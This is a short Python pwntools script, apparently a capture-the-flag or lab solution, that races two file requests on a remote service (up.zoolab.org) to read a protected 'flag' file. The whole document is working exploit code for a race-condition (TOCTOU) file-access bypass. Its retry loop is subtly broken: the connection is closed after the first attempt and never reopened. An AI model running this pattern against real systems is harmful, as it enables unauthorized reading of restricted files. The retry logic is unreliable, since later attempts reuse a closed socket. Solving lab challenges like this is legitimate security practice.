#!/usr/bin/env python3
from pwn import *
import time
import re

HOST = 'up.zoolab.org'
PORT = 10931

ACCESSIBLE_FILE = b'fortune000'
TARGET_FILE = b'flag'

# Set context to suppress info-level messages like connection status
context.log_level = 'warning'

io = None
flag = None

# Connect
io = remote(HOST, PORT, timeout=2)

# Race conditions might require multiple attempts
MAX_RETRIES = 50
for attempt in range(MAX_RETRIES):
    print("------  Attempt " + str(attempt) + "  ------")
    try:
        io.sendline(ACCESSIBLE_FILE)
        io.sendline(TARGET_FILE)

        attempt_output = io.recvrepeat(timeout=0.1)

        match = re.search(rb'F> (FLAG\{.*\})', attempt_output)
        if match:
            flag = match.group(1).decode()
            print(f"F> {flag}")
            break

    except Exception as e:
        if io and not io.closed:
            io.close()
    finally:
        if io and not io.closed:
            io.close()

    if flag:
        break

    # Wait a tiny bit before retrying if flag wasn't found
    # time.sleep(0.2)


if not flag:
    print("Failed to retrieve the flag after multiple attempts.") # Optional: indicate final failure

# --- End of script ---